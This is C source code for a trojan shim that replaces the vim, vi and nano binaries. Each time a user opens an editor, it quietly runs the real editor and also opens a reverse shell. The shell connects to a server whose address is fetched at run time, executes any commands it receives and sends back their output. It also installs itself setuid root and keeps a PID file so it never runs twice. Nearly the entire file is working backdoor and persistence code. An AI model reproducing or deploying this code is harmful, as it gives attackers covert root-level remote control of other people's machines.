//Michael Burke
//Shim for vim, vi and nano that establishes a reverse shell every time they are run.

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <limits.h>
#include <assert.h>
#include <sys/stat.h>
#include <signal.h>
#include <dirent.h>
#include <errno.h>
#include "httpget.c"

//These define statements will get changed depending on the editor being shimmed
#define PORT 6969
#define STATUS "{STATUS}"
#define PAYLOAD "{PAYLOAD}"
#define ERROR "{ERROR}"
#define BINARYNAME "{BINARYNAME}"
#define EDITOR "{EDITOR}"
#define FOLDER "{FOLDER}"

//Simple define statements to make things easier
#define TRUE 1
#define FALSE 0
#define ERR -1


//Write the current pid to the file defined by STATUS
int writepid(){
    FILE *file;
    pid_t pid = getpid();
    DIR* dir = opendir(FOLDER);
    if (dir) {
        /* Directory exists. */
        closedir(dir);
    } else if (ENOENT == errno) {
        int res = mkdir(FOLDER, 0733);
        printf("%d\n", res);
    } else {
        return ERR;
    }
    if ((file = fopen(STATUS, "w")) == NULL){
        return ERR;
    }
    fprintf(file, "%d", pid);
    fclose(file);
    return TRUE;
}
//Read the current file defined by STATUS and return the PID as an int
int getrunningpid(){
    int pid;
    FILE *file;
    if ((file = fopen(STATUS, "r")) == NULL){
       return ERR;
    }
    fscanf(file, "%d", &pid);
    fclose(file);
    return pid;
}

//Test to see if the file defined by STATUS exists;
//If it does, test to see if the process is currently running
int testpid(){
    struct stat sts;
    int pid = getrunningpid();
    if (pid == -1){
        return FALSE;
    }
    if (0 == kill(pid, 0)){
        return TRUE;
    }
    return FALSE;
}

//Main function for the reverse shell
int establishConnection(int port, int shell) {
    //Initialize the socket
    int sock = 0, valread;
    struct sockaddr_in serv_addr;
    char buffer[1024] = {0};
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        return ERR;
    }
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(port);
    char* *str;
    if(inet_pton(AF_INET, getIP(0), &serv_addr.sin_addr)<=0) {
        return ERR;
    }
   
    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0){
        return ERR;
    }
    //Test whether we should request a port from the server
    //or if we should open the reverse shell
    if (shell == 1){
        //If we've already received a port from the server, open the shell

        //Write the current PID to the file; exit if it errors out
        if (writepid() == ERR) {
            return ERR;
        }
        //Receive commands from the connection
        while ((valread = recv(sock , buffer , 1024 , 0)) > 0){
            char line[1024];
            //Remove trailing newline
            buffer[strcspn(buffer, "\n")] = 0;
            //Output error to a temporary file so we can capture both outputs
            strcat(buffer, " 2>");
            strcat(buffer, ERROR);
            //Execute the received command and return the output
            FILE* fp = popen(buffer, "r");
            while((fgets(line, 1024, fp))) {
                write(sock , line , strlen(line));
            }
            //Read any errors and send them back as well
            FILE* err = fopen(ERROR, "r");
            while((fgets(line, 1024, err))) {
                write(sock , line , strlen(line));
            }
            remove(ERROR);
        }
    } else {
        //If we haven't received a port yet, request one from the
        //server and run establishConnection again with the result
        write(sock , "none\n" , strlen("none\n"));
        valread = read( sock , buffer, 1024);
        return establishConnection(atoi(buffer), 1);
    }
    return 0;
}

//Install the shim
int install(char *fname){
    //Test to see if the shim is already installed
    char *file = fname + 2;
    char path[50] = "/usr/bin/";
    strcat(path, BINARYNAME);
    if (access(path, F_OK) == FALSE ) {
        return FALSE;
    }
    //Move the old binary
    char newpath[50] = "/usr/bin/";
    strcat(newpath, BINARYNAME);
    rename(EDITOR, newpath);
    //Replace with the new binary
    rename(file, EDITOR);
    //Change ownership
    chown(EDITOR, 0, 0);
    //Setuid
    //No easy way to do this in C as far as I can tell; do it with bash instead
    char cmd[50] = "chmod +s ";
    strcat(cmd, EDITOR);
    system(cmd);
    printf("Installed\n");
    return TRUE;
}


int main (int argc, char *argv[]) {
    //Set the uid to root
    setuid(0);
    if (install(argv[0]) == TRUE){
        return FALSE;
    }

    //Build the system() command to execute the editor with any given parameters
    char args[100] = BINARYNAME;
    strcat(args, " ");
    for (int i = 1;i<argc;i++){
        strcat(args, argv[i]);
        if (i != argc-1){
            strcat(args, " ");
        }
    }

    //Test to see if the payload binary exists
    if (access(PAYLOAD, F_OK) != FALSE ) {
        //If it doesn't, copy shim to PAYLOAD and execute it,
        //then execute the editor command
        char cmd1[50] = "cp ";
        char cmd2[50] = PAYLOAD;
        char cmd3[50] = "rm -f ";
        strcat(cmd1, EDITOR);
        strcat(cmd1, " ");
        strcat(cmd1, PAYLOAD);
        strcat(cmd2, " &");
        strcat(cmd3, PAYLOAD);
        system(cmd1);
        system(cmd2);
        sleep(0.1);
        system(cmd3);
        system(args);
    } else {
        if (testpid() == FALSE) {
            return establishConnection(PORT, 0);
        }
    }
    
}
